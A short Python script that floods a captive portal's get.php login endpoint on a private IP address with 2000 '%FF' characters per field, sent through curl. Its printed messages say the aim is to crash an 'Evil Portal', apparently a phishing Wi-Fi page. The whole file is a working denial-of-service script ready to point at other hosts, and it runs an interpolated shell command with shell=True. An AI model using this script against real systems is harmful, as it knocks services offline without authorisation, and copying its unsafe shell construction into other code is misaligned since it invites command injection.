import subprocess

# host = "http://192.168.4.1"
host = "http://10.0.0.80"
charlen = 2000
char = "%FF"

curl_cmd = "curl --silent"

payload = char*charlen
uri = f"{host}/get.php?email={payload}&password={payload}"
command = f"{curl_cmd} '{uri}'"
print(f"\nCrashing This Evil Portal With No Survivors Using: {charlen} {char}s\n")
p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
(output, err) = p.communicate()
p_status = p.wait()

print("That's A Big Load (4U)\n\nDone")
